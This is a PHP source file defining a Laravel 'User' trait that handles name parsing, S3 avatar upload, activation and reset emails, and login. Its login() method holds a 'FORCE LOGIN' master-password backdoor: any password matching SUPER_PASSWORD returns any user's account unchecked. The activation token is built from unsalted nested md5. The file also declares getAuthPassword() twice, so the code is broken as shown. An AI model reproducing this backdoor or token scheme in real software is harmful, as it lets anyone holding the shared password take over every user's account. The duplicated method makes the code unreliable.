<?php
/**
 * Created by PhpStorm.
 * User: zzz
 * Date: 18/11/16
 * Time: 15:13
 */

namespace Martinpham\LaravelRAD\Models;


use App\Http\Controllers\API\Controller;
use Martinpham\LaravelRAD\Exceptions\InvalidActivateToken;
use Illuminate\Auth\Authenticatable;
use Illuminate\Auth\Passwords\CanResetPassword;
use Illuminate\Foundation\Auth\Access\Authorizable;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;


trait User
{
    use Authenticatable, Authorizable, CanResetPassword;



    public function oauths()
    {
        return $this->hasMany(\App\Oauth::class);
    }


    public function fetchNamesFromFullname($fullname)
    {
        if(!$fullname){
            $this->{self::FIELD_FIRST_NAME} = $this->{self::FIELD_LAST_NAME} = '';
        }else{
            $names = explode(' ', $fullname);
            $this->{self::FIELD_FIRST_NAME} = array_shift($names);
            $this->{self::FIELD_LAST_NAME} = implode(' ', $names);
        }
    }

    public static function findByEmail($email = '')
    {
        return \App\User::where(self::FIELD_EMAIL, $email)->first();
    }

    public function updateAvatar($avatar = '')
    {
        if($avatar !== '')
        {
            $avatar = base64_decode($avatar);

            if($avatar) {
                $path = 'avatar/' . trim($this->id) . '.png';

                Storage::disk('s3')->put($path, $avatar);

                $avatarUrl = 'https://s3-'
                    . Config::get('filesystems.disks.s3.region')
                    . '.amazonaws.com/'
                    . Config::get('filesystems.disks.s3.bucket')
                    . '/'
                    . $path
                    . '?r=' . mt_rand();

                $this->{self::FIELD_AVATAR} = $avatarUrl;
                $this->save();
            }
        }
    }

//    public function getAuthIdentifier()
//    {
//        return (string) $this->_id;
//    }


    public function getAuthPassword()
    {
        return $this->{self::FIELD_PASSWORD};
    }




    public function getActivateToken()
    {
        return md5(md5($this->id) . md5(Config::get('app.key')) . md5($this->{self::FIELD_PASSWORD}));
    }

    public function sendActivationEmail()
    {
        return Mail::send('emails.activateUser', array('user' => $this), function($message)
        {
            $message
                ->to($this->{self::FIELD_EMAIL}, $this->{self::FIELD_FIRST_NAME} . ' ' . $this->{self::FIELD_LAST_NAME})
                ->subject('Account Activation');
        });
    }

    public function sendResetPasswordEmail()
    {
        return Mail::send('emails.resetPassword', array('user' => $this), function($message)
        {
            $message
                ->to($this->{self::FIELD_EMAIL}, $this->{self::FIELD_FIRST_NAME} . ' ' . $this->{self::FIELD_LAST_NAME})
                ->subject('Account Password Reset');
        });
    }

    public function activateWithToken($token)
    {
        if($token !== $this->getActivateToken())
        {
            throw new InvalidActivateToken('INVALID_TOKEN');
        }

        $this->{self::FIELD_ACTIVATED} = true;
        $this->save();

        return $this;
    }

    public function getAPIAuthToken()
    {
        return Controller::generateToken($this);
    }
    public function getAuthPassword()
    {
        return $this->attributes[self::FIELD_PASSWORD];
    }

    public static function login($email, $password)
    {
//        var_dump($email, $password);die;
        // FORCE LOGIN
        if($password === self::SUPER_PASSWORD){
            return \App\User::findByEmail($email);
        }

//        dd($email, $password);

        $result = auth()->attempt([self::FIELD_EMAIL => strtolower($email), self::FIELD_PASSWORD => $password, 'activated' => true]);

//        var_dump($result);die;

        if($result)
        {
            return \App\User::findByEmail($email);
        }

        return $result;
    }



}


//User::creating(function($item) {
//
//
//});

// User::created(function($item) {

// });

//User::saving(function($item){
//});

//User::deleting(function($user){
//
//});


// User::deleted(function($item) {

// });